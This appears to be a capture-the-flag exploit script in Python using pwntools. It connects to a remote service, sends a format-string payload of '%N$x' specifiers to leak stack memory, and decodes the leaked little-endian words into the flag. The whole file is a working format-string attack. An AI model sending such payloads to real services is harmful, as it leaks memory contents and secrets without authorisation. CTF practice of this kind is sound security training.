from pwn import (
    args,
    gdb,
    remote,
    process,
    p64,
    u64,
    flat,
    ROP,
    ELF,
    context,
    log,
    sys,
    warnings,
)


def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)


warnings.filterwarnings("ignore")
gdbscript = """
init-pwndbg
continue
""".format(**locals())

context.log_level = "debug"
# context.terminal = "kitty"

io = start()

payload = b"".join([f"%{i}$x.".encode() for i in range(36, 46)])
print(payload)
io.sendlineafter(b">> ", payload)
io.recvuntil(b"Here's a story - \n")
flag = "".join(
    [bytes.fromhex(i)[::-1].decode() for i in io.recvline().decode().split(".")]
)

print(flag)
